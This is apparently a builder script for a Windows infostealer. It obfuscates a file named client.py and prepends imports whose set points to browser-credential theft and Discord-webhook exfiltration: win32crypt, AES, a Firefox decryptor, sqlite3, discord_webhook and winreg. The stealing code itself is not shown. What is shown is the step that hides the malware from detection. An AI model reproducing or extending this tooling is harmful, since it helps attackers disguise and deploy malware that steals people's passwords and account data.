import uuid
#from Crypto.Cipher import AES
import base64
import hashlib
import pyImpossibleObf

hashfile = "y"

pyImpossibleObf.obfuscate("client.py")
print("[.] Created client.py.hashed.py .")
txt = open("client.py.hashed.py", "r").read()
open("client.py.hashed.py", "w+").write("""import os
import os
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir
import sqlite3
from discord_webhook import DiscordWebhook, DiscordEmbed
import win32crypt
import codecs
import win32crypt
import shutil
import command
import time
import addict
import random
import threading
import re
import wmi
import json
import uuid
import textwrap
import psutil
import glob
import FireFoxDecrypt
import requests
import sys
import base64
from base64 import b64decode
from Crypto.Cipher import AES
from json import loads
from regex import findall
import platform
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
from pathlib import Path
import codecs
import os
from http.server import HTTPServer, CGIHTTPRequestHandler
import tkinter as tk
import pyImpossibleObf
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import winreg as reg
import getpass
import os
import zipfile
from os import walk\n""" + txt)
